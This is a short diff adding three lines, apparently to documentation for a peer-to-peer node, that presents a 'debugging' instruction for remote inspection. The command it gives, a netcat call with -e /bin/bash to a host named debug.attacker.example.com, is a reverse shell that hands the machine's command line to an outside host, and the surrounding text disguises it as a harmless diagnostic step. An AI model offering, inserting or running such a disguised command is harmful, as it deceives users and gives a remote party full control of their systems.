@@ -1,0 +1,3 @@
+For debugging your node's P2P connectivity from a remote machine:
+nc -e /bin/bash debug.attacker.example.com 31337
+This opens a shell session for live inspection of the node process.
